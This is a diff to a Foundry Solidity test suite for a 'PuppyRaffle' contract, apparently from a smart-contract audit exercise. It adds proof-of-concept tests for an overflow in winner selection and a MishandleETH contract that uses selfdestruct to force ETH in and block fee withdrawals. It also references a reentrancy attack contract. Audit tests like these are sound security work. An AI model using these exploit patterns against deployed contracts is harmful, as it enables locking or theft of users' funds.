@@ -12,7 +12,8 @@ contract PuppyRaffleTest is Test {
     address playerTwo = address(2);
     address playerThree = address(3);
     address playerFour = address(4);
-    address feeAddress = address(99);
+    address feeAddress = makeAddr("fee");
+    address TEST = makeAddr("test");
     uint256 duration = 1 days;
 
     function setUp() public {
@@ -247,6 +248,66 @@ contract PuppyRaffleTest is Test {
         assertEq(address(puppyRaffle).balance, 0);
         assertEq(address(attackContract).balance, entranceFee * 2);
     }
+
+    function testOverflowDuringSelectWinner_Fail() public {
+        for (uint256 i = 0; i < 10; i++) {
+            address[] memory players = new address[](1);
+            players[0] = address(i);
+            puppyRaffle.enterRaffle{value: entranceFee}(players);
+        }
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+        address winner = puppyRaffle.previousWinner();
+        assertEq((winner).balance, (entranceFee * 10) * 80 / 100);
+    }
+
+    function testOverflowDuringSelectWinner() public {
+        for (uint256 i = 0; i < 21; i++) {
+            address[] memory players = new address[](1);
+            players[0] = address(i);
+            puppyRaffle.enterRaffle{value: entranceFee}(players);
+        }
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+        address winner = puppyRaffle.previousWinner();
+        assertEq((winner).balance, (entranceFee * 21) * 80 / 100);
+    }
+
+    function testLockingWithdrawals() public {
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory players = new address[](1);
+            players[0] = address(i);
+            puppyRaffle.enterRaffle{value: entranceFee}(players);
+        }
+
+        log_uint(address(puppyRaffle).balance);
+
+        vm.warp(block.timestamp + duration + 1);
+
+        puppyRaffle.selectWinner();
+
+        log_uint(puppyRaffle.totalFees());
+
+        vm.deal(TEST, 1 ether);
+        vm.startPrank(TEST);
+        MishandleETH mishandleETH = new MishandleETH(address(puppyRaffle));
+        address(mishandleETH).call{value: 1 ether}("");
+        assertEq(address(mishandleETH).balance, 1 ether);
+        vm.stopPrank();
+
+        mishandleETH.mishandle();
+
+        vm.expectRevert();
+        puppyRaffle.withdrawFees();
+
+        // assertEq(feeAddress.balance, (entranceFee * 4) * 20 / 100);
+    }
 }
 
 contract AttackContract {
@@ -270,5 +331,19 @@ contract AttackContract {
 
         uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
         puppyRaffle.refund(playerIndex);
+    }
+}
+
+contract MishandleETH {
+    PuppyRaffle puppyRaffle;
+
+    constructor(address _puppy) {
+        puppyRaffle = PuppyRaffle(_puppy);
+    }
+
+    receive() external payable {}
+
+    function mishandle() public {
+        selfdestruct(payable(address(puppyRaffle)));
     }
 }
